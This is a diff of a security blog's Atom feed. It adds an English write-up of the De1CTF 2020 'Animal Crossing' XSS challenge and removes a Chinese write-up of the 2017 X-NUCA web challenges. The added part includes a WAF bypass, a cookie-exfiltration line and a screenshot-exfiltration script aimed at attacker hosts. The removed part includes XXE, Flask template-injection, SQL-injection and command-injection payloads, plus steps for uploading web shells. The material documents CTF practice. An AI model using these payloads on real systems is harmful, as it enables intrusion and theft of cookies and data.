@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.codemonster.cn/"/>
-  <updated>2020-05-06T05:35:34.542Z</updated>
+  <updated>2020-05-06T05:40:31.233Z</updated>
   <id>https://www.codemonster.cn/</id>
   
   <author>
@@ -14,6 +14,63 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2020 De1CTF Animal Crossing WriteUp (En)</title>
+    <link href="https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup-en/"/>
+    <id>https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup-en/</id>
+    <published>2020-05-06T05:34:59.000Z</published>
+    <updated>2020-05-06T05:40:31.233Z</updated>
+    
+    <content type="html"><![CDATA[<p>2020 De1CTF Animal Crossing WriteUp.<br><a id="more"></a></p>
+<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Free passport creator lets you show your island!</p>
+<h2 id="Level-1-bypass-the-cloud-WAF"><a href="#Level-1-bypass-the-cloud-WAF" class="headerlink" title="Level 1: bypass the cloud WAF"></a>Level 1: bypass the cloud WAF</h2><p>Cloud WAF usually has several layers and several filtering methods. Here I also designed two layers of protection.</p>
+<h3 id="Layer-1-Blacklist-detection"><a href="#Layer-1-Blacklist-detection" class="headerlink" title="Layer 1: Blacklist detection"></a>Layer 1: Blacklist detection</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> blackList = []<span class="keyword">string</span>&#123;</div><div class="line">	<span class="comment">//global</span></div><div class="line">	<span class="string">"document"</span>, <span class="string">"window"</span>, <span class="string">"top"</span>, <span class="string">"parent"</span>, <span class="string">"global"</span>, <span class="string">"this"</span>,</div><div class="line">	<span class="comment">//func</span></div><div class="line">	<span class="string">"console"</span>, <span class="string">"alert"</span>, <span class="string">"log"</span>, <span class="string">"promise"</span>, <span class="string">"fetch"</span>, <span class="string">"eval"</span>, <span class="string">"import"</span>,</div><div class="line">	<span class="comment">//char</span></div><div class="line">	<span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"`"</span>, <span class="string">"\\*"</span>, <span class="string">"&amp;"</span>, <span class="string">"#"</span>, <span class="string">"%"</span>, <span class="string">"\\\\"</span>,</div><div class="line">	<span class="comment">//key</span></div><div class="line">	<span class="string">"if"</span>, <span class="string">"set"</span>, <span class="string">"get"</span>, <span class="string">"with"</span>, <span class="string">"yield"</span>, <span class="string">"async"</span>, <span class="string">"wait"</span>, <span class="string">"func"</span>, <span class="string">"for"</span>, <span class="string">"error"</span>, <span class="string">"string"</span>,</div><div class="line">	<span class="comment">//string</span></div><div class="line">	<span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"url"</span>, <span class="string">"cookie"</span>, <span class="string">"src"</span>,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>The way to bypass the blacklist is to avoid the strings and characters of ban. Here, because of the iris framework problem of go, the <code>;</code> and the data after it will be deleted, and can be bypassed with <code>%0a</code></p>
+<h3 id="Layer-2-Static-syntax-analysis"><a href="#Layer-2-Static-syntax-analysis" class="headerlink" title="Layer 2: Static syntax analysis"></a>Layer 2: Static syntax analysis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1. Pass in data to fmt.Sprintf(&quot;&apos;%s&apos;;&quot;, data), and then parse the syntax. If parse fails, the error will be returned directly.</div><div class="line">2. And then we visit AST nodes:</div><div class="line">   1. VariableExpression/AssignExpression, All declaration/assignment statements will ban</div><div class="line">   2. CallExpression, all function call, and callee not Identifier, will ban, example:</div><div class="line">      1. ban:  test.test()、a[x]()</div><div class="line">      2. pass: test()</div><div class="line">   3. BracketExpression, all member reference and member is not Identifier, will ban, example:</div><div class="line">      1. ban:  a[1]、a[&apos;xx&apos;]</div><div class="line">      2. pass: a[x]</div></pre></td></tr></table></figure>
+<p>This layer of WAF, in fact, only needs to find out the rule of ban and find the unprocessed syntax to bypass it. My expected solution here is to pass variables with <code>throw</code>, but there are many other syntax that can be used.</p>
+<p>The payload:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">data=base64DATAXXXXXXX<span class="string">'%0atry&#123;throw '</span>ev<span class="string">'%2b'</span>al<span class="string">'&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a//</span></div></pre></td></tr></table></figure>
+<p>After bypassing the two layers of WAF protection, the local successful alert, we can use:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">location.href = <span class="string">"http://xxxx/?"</span> + btoa(ducument.cookie)</div></pre></td></tr></table></figure>
+<p>get the admin cookie, and the cookie is a part of the flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG=De1CTF&#123;I_l1k4_</div></pre></td></tr></table></figure>
+<h2 id="Level-2-read-400-pictures"><a href="#Level-2-read-400-pictures" class="headerlink" title="Level 2: read 400 pictures"></a>Level 2: read 400 pictures</h2><p>In the other half of the flag, hint:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">What is the admin doing?</div></pre></td></tr></table></figure>
+<p>Read the administrator’s document, you will find that there are  400 PNG images, and the flag is hidden in these images. </p>
+<p>Here are several solutions preset during the design:</p>
+<ol>
+<li>Bypass CSP to import html2canvas lib, get the screenshot and upload to server, get the image address and send it back, then download the image</li>
+<li>Use the for loop to send all 400 pictures to /upload, get 400 picture addresses and send back</li>
+<li>Read the pictures directly and send them back one by one, write scripts, or use for to circulate and batch transfer, but the return process needs code conversion, and after the transfer back, it also needs to be converted into pictures for splicing</li>
+</ol>
+<p>All three solutions can get the flag, I will introduce the solution of bypassing CSP and import html2canvas lib. Other methods are similar, so I won’t write them all (You can go to see the players’ writeup),</p>
+<h3 id="Bypass-CSP-to-import-html2canvas-lib"><a href="#Bypass-CSP-to-import-html2canvas-lib" class="headerlink" title="Bypass CSP to import html2canvas lib"></a>Bypass CSP to import html2canvas lib</h3><p>The main function of this website is to create a animal crossing passport, The homepage has a <code>/upload</code> api for upload image, you can upload a file with <code>png</code> suffix, and use <code>fetch</code> get the png file source, then <code>eval</code> it. You can bypass CSP to import the html2canvas lib and execute it. </p>
+<p>The png file:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">	...</div><div class="line">  ...</div><div class="line">html2canvas.js code</div><div class="line">	...</div><div class="line">  ...</div><div class="line"></div><div class="line"><span class="comment">// screenshot-&gt;upload screenshot-&gt;send img address back</span></div><div class="line">html2canvas(<span class="built_in">document</span>.body).then(<span class="function"><span class="keyword">function</span>(<span class="params">canvas</span>) </span>&#123;</div><div class="line">        <span class="keyword">const</span> form = <span class="keyword">new</span> FormData(),</div><div class="line">        url = <span class="string">"/upload"</span>,</div><div class="line">        blob = <span class="keyword">new</span> Blob([canvas.toDataURL().toString()], &#123;<span class="attr">type</span> : <span class="string">"image/png"</span>&#125;)</div><div class="line">        file = <span class="keyword">new</span> File([blob], <span class="string">"a.png"</span>)</div><div class="line">        form.append(<span class="string">"file"</span>, file)</div><div class="line">        fetch(url, &#123;</div><div class="line">            method: <span class="string">"POST"</span>,</div><div class="line">            body: form</div><div class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> response.json()</div><div class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">            location.href=<span class="string">"//xxxxxxxxx:8099/?"</span>+data.data.toString()</div><div class="line">        &#125;)</div><div class="line">  &#125;)</div></pre></td></tr></table></figure>
+<p>Here I also write the JS of screenshot operation into png. </p>
+<p>It upload the screenshot to the server and get the returned image address, then send it back to the attacker</p>
+<h3 id="Read-image-and-execute"><a href="#Read-image-and-execute" class="headerlink" title="Read image and execute"></a>Read image and execute</h3><p>After upload the image, get the png address, then you can read the image with the controllable JS part and execute it</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fetch(<span class="string">`/static/images/xxxxxxxxx.png`</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>res.text()).then(<span class="function"><span class="params">txt</span>=&gt;</span><span class="built_in">eval</span>(txt))</div></pre></td></tr></table></figure>
+<p>And you can use the method of bypassing the WAF to pack it</p>
+<p>Finally, when submitted to the BOT, you can receive the address of the screenshot of the admin’s interface, and download it to see the other half of the flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cool_GamE&#125;</div></pre></td></tr></table></figure>
+<p>Flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">De1CTF&#123;I_l1k4_cool_GamE&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;2020 De1CTF Animal Crossing WriteUp.&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="XSS" scheme="https://www.codemonster.cn/tags/XSS/"/>
+    
+  </entry>
   
   <entry>
     <title>2020 De1CTF Animal Crossing WriteUp</title>
@@ -1041,67 +1098,6 @@
       <category term="审计" scheme="https://www.codemonster.cn/tags/%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="注入" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2017 XNUCA-第一期：Web WriteUp</title>
-    <link href="https://www.codemonster.cn/2017/08/30/2017-xnuca-web-writeup/"/>
-    <id>https://www.codemonster.cn/2017/08/30/2017-xnuca-web-writeup/</id>
-    <published>2017-08-30T14:34:58.000Z</published>
-    <updated>2018-05-04T07:47:50.014Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="No-1-你喜欢颜文字么"><a href="#No-1-你喜欢颜文字么" class="headerlink" title="#No.1 你喜欢颜文字么"></a>#No.1 你喜欢颜文字么</h2><p>重置密码输入admin和喜欢就拿下flag了<br><a id="more"></a></p>
-<h2 id="No-2-让你无语的md5"><a href="#No-2-让你无语的md5" class="headerlink" title="#No.2 让你无语的md5"></a>#No.2 让你无语的md5</h2><p>输入admin提示非法，输入admin加一个空格拿到一个md5，解密得到flag</p>
-<h2 id="No-3-Pav1和lloowweerr…"><a href="#No-3-Pav1和lloowweerr…" class="headerlink" title="#No.3 Pav1和lloowweerr…"></a>#No.3 Pav1和lloowweerr…</h2><p><code>FFmpeg任意文件读取</code>漏洞，构造读取flag文件的avi，上传后下载打开得到flag<br>参考链接：<a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/138377.html</a></p>
-<h2 id="No-4-X-NUCA-2017’s-S…"><a href="#No-4-X-NUCA-2017’s-S…" class="headerlink" title="#No.4 X-NUCA 2017’s S…"></a>#No.4 X-NUCA 2017’s S…</h2><p>没做出来<br>ROIS WriteUp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/res/site.war 下载源码 zip 解压 jd-gui 看 class</div><div class="line">注册的时候加一个 isActive=1 就能登录</div><div class="line">然后现在是要让 isSupaAdministrata=1</div><div class="line">参考 http://blog.csdn.net/qq_27446553/article/details/73480823 对象自动绑定</div><div class="line">拿到http://a4b359466421ae3aa76a8b116dda3870.xnuca.cn/res/HYGorlL29LtcMCR6GUg23XRM</div><div class="line">JxVge5F7.js</div></pre></td></tr></table></figure></p>
-<h2 id="No-5-Lucky-Number-Ca…"><a href="#No-5-Lucky-Number-Ca…" class="headerlink" title="#No.5 Lucky Number Ca…"></a>#No.5 Lucky Number Ca…</h2><p><code>Xxe</code>，构造post内容如下，但是死都找不到flag，赛后听说在/etc/hosts，感觉这种藏着掖着flag的题很没意思<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE xdsec[</span></div><div class="line"><span class="meta">&lt;!ELEMENT methodname ANY&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<h2 id="No-6-Hello-World"><a href="#No-6-Hello-World" class="headerlink" title="#No.6 Hello World"></a>#No.6 Hello World</h2><p>看提示直接fuzz到.git目录，下载下来后可以看到代码。<br>有个<code>flag.php</code> 和<code>flag.js</code>，flag.php提示flag not here<br>猜测用了git的修改记录隐藏数据，在日志中看不到其他的修改日志<br>可以用<code>显示引用记录</code>的方式查看。<br>然后又找到一个flag.js比较两个flag.js得到<code>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</code></p>
-<h2 id="No-7-xblog"><a href="#No-7-xblog" class="headerlink" title="#No.7 xblog"></a>#No.7 xblog</h2><p>有源码泄露，但是没做出来</p>
-<h2 id="No-8-看视频真嗨皮"><a href="#No-8-看视频真嗨皮" class="headerlink" title="#No.8 看视频真嗨皮"></a>#No.8 看视频真嗨皮</h2><p><code>海洋cms</code><br>找到<code>exp</code>构造<code>post</code>数据即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://567252405122515e0ed912af9b26d404.xnuca.cn/search.php?searchtype=5</div></pre></td></tr></table></figure></p>
-<p>post数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchword=d&amp;order=&#125;&#123;endif&#125;&#123;if:1)eval($_POST[x]);if(1&#125;&#123;end if&#125;&amp;x=$TxtRes=file_put_contents(&quot;writeHere/da6afcecd8a4915e67964700d2008d29&quot;, &quot;test&quot;);echo 666;</div></pre></td></tr></table></figure></p>
-<p>参考链接：<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28" target="_blank" rel="noopener">http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28</a></p>
-<h2 id="No-9-The-Best-Commun…"><a href="#No-9-The-Best-Commun…" class="headerlink" title="#No.9 The Best Commun…"></a>#No.9 The Best Commun…</h2><p><code>Dolphin</code><br>直接exp打，本来就想随便试一试结果直接进到一个命令行模式，就是成功了，输入system();命令拿flag<br>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-92546" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92546</a></p>
-<h2 id="No-10-买买买！"><a href="#No-10-买买买！" class="headerlink" title="#No.10 买买买！"></a>#No.10 买买买！</h2><p>没做</p>
-<h2 id="No-11-两只小蜜蜂啊"><a href="#No-11-两只小蜜蜂啊" class="headerlink" title="#No.11 两只小蜜蜂啊"></a>#No.11 两只小蜜蜂啊</h2><p><code>Beescms</code><br>跟着exp走，先拿后台权限在上传shell<br>参考链接：<a href="https://bbs.ichunqiu.com/thread-13977-1-1.html?from=jike" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-13977-1-1.html?from=jike</a></p>
-<h2 id="No-12-社工库"><a href="#No-12-社工库" class="headerlink" title="#No.12 社工库"></a>#No.12 社工库</h2><p>没做</p>
-<h2 id="No-13-程序员怎么能不知道Jenkin…"><a href="#No-13-程序员怎么能不知道Jenkin…" class="headerlink" title="#No.13 程序员怎么能不知道Jenkin…"></a>#No.13 程序员怎么能不知道Jenkin…</h2><p><code>Jenkins</code><br>找到了exp但是没打成功</p>
-<h2 id="No-14-试一试"><a href="#No-14-试一试" class="headerlink" title="#No.14 试一试"></a>#No.14 试一试</h2><p><code>多米cms</code>，有个通用注入漏洞，但是好像加了waf，没有花时间去绕过，没做出来<br>ROIS的payload：<code>search.php?jq=1);system(dir);//&amp;searchtype=5</code></p>
-<h2 id="No-15-猜一猜"><a href="#No-15-猜一猜" class="headerlink" title="#No.15 猜一猜"></a>#No.15 猜一猜</h2><p><code>Joomla</code></p>
-<p>没做出来</p>
-<h2 id="No-16-来一发flask"><a href="#No-16-来一发flask" class="headerlink" title="#No.16 来一发flask"></a>#No.16 来一发flask</h2><p><code>Flask</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://062ed0f9233795319ceac93209b40860.xnuca.cn/invalid&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/flag.txt&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
-<p>只读了flag，写的部分没有成功<br>参考链接：<a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98928.html</a><br>ROIS:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;os&apos;].popen(&apos;id&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="No-17-简单点"><a href="#No-17-简单点" class="headerlink" title="#No.17 简单点"></a>#No.17 简单点</h2><p><code>CMS Made Simpl CMS</code></p>
-<p>没做出来</p>
-<h2 id="No-18-“开讲啦”"><a href="#No-18-“开讲啦”" class="headerlink" title="#No.18 “开讲啦”"></a>#No.18 “开讲啦”</h2><p><code>Acontent</code>，查到了cve但是没利用成功<br>Ph0en1x WriteUp：<br><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.php</div><div class="line">POST:</div><div class="line">grade=1&amp;key=1&amp;secret=secret&amp;sourcedid=1&amp;submit=Send%20Grade&amp;url=/etc/flag.txt</div></pre></td></tr></table></figure></p>
-<h2 id="No-19-写个简历吧"><a href="#No-19-写个简历吧" class="headerlink" title="#No.19 写个简历吧"></a>#No.19 写个简历吧</h2><p>没做</p>
-<h2 id="No-20-SQL注入"><a href="#No-20-SQL注入" class="headerlink" title="#No.20 SQL注入"></a>#No.20 SQL注入</h2><p>也是<code>Joomla</code>，没做</p>
-<h2 id="No-21-Freecms"><a href="#No-21-Freecms" class="headerlink" title="#No.21 Freecms"></a>#No.21 Freecms</h2><p><code>Freecms</code><br>Struts2-045直接打<code>http://cc7777fe6a8ce0d9544b623a0d2961fb.xnuca.cn/login_login.do</code><br><code>echo &quot;111&quot; &gt;/opt/apache-tomcat-8.0.44/webapps/ROOT/writeHere/da6afcecd8a4915e67964700d2008d29</code></p>
-<h2 id="No-22-Phpcms-v9"><a href="#No-22-Phpcms-v9" class="headerlink" title="#No.22 Phpcms_v9"></a>#No.22 Phpcms_v9</h2><p><code>Phpcms9.6.3</code>，没做出来，貌似还加了waf</p>
-<h2 id="No-23-找入口"><a href="#No-23-找入口" class="headerlink" title="#No.23 找入口"></a>#No.23 找入口</h2><p><code>Wolfcms</code><br>admin admin 进后台，上传php拿到shell<br>参考链接：<a href="http://blog.csdn.net/hitwangpeng/article/details/45620701" target="_blank" rel="noopener">http://blog.csdn.net/hitwangpeng/article/details/45620701</a></p>
-<h2 id="No-24-可爱的星星"><a href="#No-24-可爱的星星" class="headerlink" title="#No.24 可爱的星星"></a>#No.24 可爱的星星</h2><p><code>Sitestar 建站之星</code>，没找到可用exp<br>ROIS:<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/index.php?_a=do_mail&amp;_m=mod_email</span> HTTP/1.1</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</div><div class="line"><span class="attribute">Cookie</span>: PHPSESSID=65676uue8hmaigepggn66pn1l6</div><div class="line"><span class="attribute">Host</span>: 522e52f9f4f81b75b2718ad29ac60c14.xnuca.cn</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">User-Agent</span>: Paw/3.1.2 (Macintosh; OS X/10.12.6) GCDHTTPRequest</div><div class="line"><span class="attribute">Content-Length</span>: 112</div><div class="line">title=aa&amp;email_s=a&amp;email_m=a&amp;type=a&amp;users=aaaa%27%7Caaa&amp;role%5B%5D=abdc%7D%27+union+select+</div><div class="line"><span class="attribute">1%2Cuser%28%29%2C3%23</span></div></pre></td></tr></table></figure></p>
-<p>注入得到 <code>admin</code> 密码 <code>1234!@#$</code><br>登录之后上传图片，文件管理中重命名为.php</p>
-<h2 id="No-25-愉快的玩耍吧"><a href="#No-25-愉快的玩耍吧" class="headerlink" title="#No.25 愉快的玩耍吧"></a>#No.25 愉快的玩耍吧</h2><p><code>Metinfo cms</code><br>跟着exp，重置admin密码为1234567，进后台上传test.php打包成的zip，type改成skin，然后templates/test.php就是flag<br>参考链接：<a href="https://www.secpulse.com/archives/41084.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41084.html</a></p>
-<h2 id="No-26-挑战自我"><a href="#No-26-挑战自我" class="headerlink" title="#No.26 挑战自我"></a>#No.26 挑战自我</h2><p>没做</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="#总结"></a>#总结</h2><p>整个比赛难度中等，基本都是在找现成exp，我们队除了MD5那题其他都是我A的，中间一度霸占榜一，但是最终排名第九，要反思的还是很多的。<br>放个图纪念曾经的榜一。<br><img src="/img/2017xnuca1.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;No-1-你喜欢颜文字么&quot;&gt;&lt;a href=&quot;#No-1-你喜欢颜文字么&quot; class=&quot;headerlink&quot; title=&quot;#No.1 你喜欢颜文字么&quot;&gt;&lt;/a&gt;#No.1 你喜欢颜文字么&lt;/h2&gt;&lt;p&gt;重置密码输入admin和喜欢就拿下flag了&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
-      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
-    
-      <category term="CMS" scheme="https://www.codemonster.cn/tags/CMS/"/>
-    
-      <category term="EXP" scheme="https://www.codemonster.cn/tags/EXP/"/>
-    
-      <category term="getshell" scheme="https://www.codemonster.cn/tags/getshell/"/>
     
   </entry>
   
